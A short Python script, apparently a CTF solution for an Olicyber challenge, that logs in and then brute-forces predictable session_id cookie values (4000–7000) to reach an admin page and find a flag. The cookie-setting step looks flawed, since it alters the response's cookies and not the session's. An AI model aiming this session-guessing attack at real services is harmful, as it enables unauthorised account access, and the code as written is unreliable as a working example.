import sys

import requests

session = requests.Session()
x = 3999

for i in range(4000,7001):
    x += 1
    register_url = 'http://too-small-reminder.challs.olicyber.it/register'
    register_data = {'username': 'admin', 'password': 'admin'}
    register_response = session.post(register_url, json=register_data)
    #print("Registrazione:")
    #print(register_response.text)

    login_url = 'http://too-small-reminder.challs.olicyber.it/login'
    login_data = {'username': "admin", 'password': 'admin'}
    login_response = session.post(login_url, json=login_data)
    #cookie = login_response.cookies
    #print("\nLogin:")
    #print(login_response.text)
    login_response.cookies.set('session_id', f'{x}')
    print(f'Tentativo: {x}')
    #for cookie in login_response.cookies:
    #    if cookie.name == 'session_id':
    #        cookie = login_response.cookies
    #        cookie = x
    #        print('Tentativo' + x)

    admin_url = 'http://too-small-reminder.challs.olicyber.it/admin'
    admin_response = session.get(admin_url)
    print("\nAdmin Page:")
    print(admin_response.text)
    if admin_response.text.__contains__('flag'):
        sys.exit()
